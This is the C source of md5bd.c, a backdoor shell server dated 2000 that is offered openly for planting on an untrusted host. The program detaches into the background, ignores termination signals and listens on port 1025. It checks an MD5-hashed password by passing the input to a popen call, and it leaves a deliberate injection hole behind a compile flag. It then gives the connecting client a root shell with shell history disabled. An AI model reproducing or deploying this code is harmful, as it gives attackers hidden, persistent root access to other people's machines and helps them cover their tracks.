/*
       md5bd.c - backdoor/shell server with md5 based authentication
     (c) 2000 by Mixter <mixter@newyorkoffice.com> http://1337.tsx.org

   This is a small server program that can be put on an untrusted host,
   without the danger of the hard-coded password being retrieved. Another
   big advantage of using md5 is that your password can be effectively as
   long as you want... I'm using md5sum since every system should have it,
   and since it's a stupid program and not worth of putting in md5 functions.

   To hash your password to md5, just: echo -n mypasswd | md5sum (duh!)
   Usage: ./md5bd, then ./nc host port, then enter your password
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <signal.h>

/* change this to 1337 if you want it to be *really* stealthy ;/ */
#define P0RT 1025

/* the default pass, "secret" */
#define MDPASS "5ebe2294ecd0e0f08eab7690d2a6ee69"

/* the stupidity of perl, realized in C... */
#define MDPROG "/bin/echo -n %s|/usr/bin/md5sum"

char md[36];

char *
mdpass(char *plain)
{
    FILE *p;
    char fmt[1024];

    snprintf(fmt, 1024, "/bin/echo -n %s|/usr/bin/md5sum", plain);
    p = popen(fmt, "r");
    memset(md, 0, 36);
    fread(md, 32, 1, p);
    fclose(p);
    return md;
}

int
main(int a, char **b)
{
    int c, d, e = sizeof(struct sockaddr_in), f;
    char p[1000];
    struct sockaddr_in l, r;

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    if (fork())
        exit(0);
    l.sin_family = AF_INET;
    l.sin_port = htons(P0RT);
    l.sin_addr.s_addr = INADDR_ANY;
    bzero(&(l.sin_zero), 8);
    c = socket(AF_INET, SOCK_STREAM, 0);
    bind(c,(struct sockaddr *) &l, sizeof(struct sockaddr));

    listen(c, 3);
    while ((d = accept(c, (struct sockaddr *) &r, &e)))
    {
        if (!fork())
        {
            recv(d, p, 1000, 0);
#ifndef REMOTELY_EXPLOITABLE
            for (f = 0; f < strlen(p); f++)
                switch (p[f])
                {
                case '|':
                case ';':
                case '&':
                case '>':
                case '`':
                case '\r':
                case '\n':
                    p[f] = '\0';
                    break;
                }
#endif /* REMOTELY_EXPLOITABLE :P */
            if (strncmp(mdpass(p), MDPASS,32) != 0)
            {
                send(d, "\377\373\001", 4, 0);
                close(d);
                exit(1);
            }
            printf ("hi.\n");
            close(0);
            close(1);
            close(2);
            dup2(d, 0);
            dup2(d, 1);
            dup2(d, 2);
            setreuid(0, 0);
            setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1);
            unsetenv("HISTFILE");
            execl("/bin/sh", "sh", (char *) 0);
            close(d);
            exit(0);
        }
    }
    return 0;
}
